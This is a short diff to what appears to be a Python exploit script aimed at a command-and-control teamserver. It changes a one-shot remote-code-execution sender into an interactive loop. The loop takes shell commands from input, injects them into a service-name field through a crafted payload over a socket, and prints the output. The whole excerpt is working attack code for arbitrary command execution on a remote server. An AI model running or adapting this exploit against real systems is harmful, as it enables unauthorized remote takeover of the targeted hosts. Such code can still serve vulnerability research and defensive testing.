@@ -374,11 +374,21 @@ def main():
 
     # Attempt pushing a command in the service name to gain RCE against teamserver
     print("[*] Attempting to send RCE Payload. . .")
-    cmd = input("CMD >> ")
-    write_socket(socket_id, create_rce_payload(args.username, cmd, demonListener))
 
-    # perform curls to test for call-backs!
-    print(f"{read_socket(socket_id).decode()}")
+    # Allow the user to run commands until they wish to terminate the session
+    cmd = ""
+    while cmd != "exit":
+        # collect input then check if exit is entered
+        cmd = input("CMD >> ")
+        if cmd == "exit":
+            break
+        # attempt sending the command to the teamserver
+        write_socket(socket_id, create_rce_payload(args.username, cmd, demonListener))
+    
+        # perform curls to test for call-backs!
+        # reading the socket after sending ws frames
+        # may not output text
+        print(f"{read_socket(socket_id).decode()}")
 
 if __name__ == "__main__":
     main()
